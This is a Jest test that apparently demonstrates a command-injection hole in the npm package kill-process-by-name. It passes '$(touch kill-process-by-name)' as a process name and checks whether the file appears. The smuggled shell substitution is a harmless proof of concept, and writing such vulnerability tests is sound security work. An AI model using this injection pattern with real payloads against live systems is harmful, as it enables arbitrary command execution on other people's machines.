test("Command Injection in kill-process-by-name", (done) => {
  expect.assertions(2);
  const kill_process_by_name = require("kill-process-by-name");
  const fs = require("fs");
  const path = "./kill-process-by-name";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  kill_process_by_name("$(touch kill-process-by-name)");
  setTimeout(() => {
    file_exist = fs.existsSync(path);
    expect(file_exist).toBe(true);
    fs.unlink(path, () => {
      done();
    });
  }, 500);
});
